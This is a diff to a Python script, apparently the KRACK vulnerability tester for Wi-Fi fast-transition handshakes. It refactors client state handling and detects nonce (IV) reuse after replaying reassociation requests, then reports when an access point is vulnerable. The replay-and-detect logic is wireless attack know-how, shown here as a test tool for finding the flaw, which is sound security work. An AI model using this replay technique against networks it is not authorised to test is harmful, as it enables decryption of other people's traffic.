@@ -20,9 +20,7 @@ IEEE80211_RADIOTAP_CHANNEL = (1 << 3)
 IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
 IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)
 
-#TODO: - !!! Detect retransmissions based on packet time and sequence counter (see client tests) !!!
 #TODO: - Merge code with client tests to avoid code duplication (including some error handling)
-#TODO: - Detect new EAPOL handshake or normal association frames (reset state and stop replaying)
 #TODO: - Option to use a secondary interface for injection + WARNING if a virtual interface is used + repeat advice to disable hardware encryption
 #TODO: - Test whether injection works on the virtual interface (send probe requests to nearby AP and wait for replies)
 #TODO: - Execute rfkill unblock wifi because some will forget this
@@ -151,14 +149,20 @@ class KRAckAttackFt():
 
 		self.sock  = None
 		self.wpasupp = None
+
+		self.reset_client()
+
+	def reset_client(self):
 		self.reassoc = None
-		self.ivs = set()
+		self.ivs = IvCollection()
 		self.next_replay = None
 
-	def handle_rx(self):
-		p = self.sock.recv()
-		if p == None: return
+	def start_replay(self, p):
+		assert Dot11ReassoReq in p
+		self.reassoc = p
+		self.next_replay = time.time() + 1
 
+	def process_frame(self, p):
 		# Detect whether hardware encryption is decrypting the frame, *and* removing the TKIP/CCMP
 		# header of the (now decrypted) frame.
 		# FIXME: Put this check in MitmSocket? We want to check this in client tests as well!
@@ -173,32 +177,35 @@ class KRAckAttackFt():
 				log(ERROR, "   Try to disable hardware encryption, or use a 2nd interface for injection.", showtime=False)
 				quit(1)
 
-
-		if p.addr2 == self.clientmac and Dot11ReassoReq in p:
+		# Client performing a (possible new) handshake
+		if self.clientmac in [p.addr1, p.addr2] and Dot11Auth in p:
+			self.reset_client()
+			log(INFO, "Detected Authentication frame, clearing client state")
+		elif p.addr2 == self.clientmac and Dot11ReassoReq in p:
+			self.reset_client()
 			if get_tlv_value(p, IEEE_TLV_TYPE_RSN) and get_tlv_value(p, IEEE_TLV_TYPE_FT):
 				log(INFO, "Detected FT reassociation frame")
-				self.reassoc = p
-				self.next_replay = time.time() + 1
+				self.start_replay(p)
 			else:
 				log(INFO, "Reassociation frame does not appear to be an FT one")
-				self.reassoc = None
-			self.ivs = set()
-
 		elif p.addr2 == self.clientmac and Dot11AssoReq in p:
 			log(INFO, "Detected normal association frame")
-			self.reassoc = None
-			self.ivs = set()
+			self.reset_client()
 
 		elif p.addr1 == self.clientmac and Dot11WEP in p:
 			iv = dot11_get_iv(p)
 			log(INFO, "AP transmitted data using IV=%d (seq=%d)" % (iv, dot11_get_seqnum(p)))
-
-			# FIXME: When the client disconnects (or reconnects), clear the set of used IVs
-			if iv in self.ivs:
+			if self.ivs.is_iv_reused(p):
 				log(INFO, ("IV reuse detected (IV=%d, seq=%d). " +
 					"AP is vulnerable!") % (iv, dot11_get_seqnum(p)), color="green")
 
-			self.ivs.add(iv)
+			self.ivs.track_used_iv(p)
+
+	def handle_rx(self):
+		p = self.sock.recv()
+		if p == None: return
+
+		self.process_frame(p)
 
 	def configure_interfaces(self):
 		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")
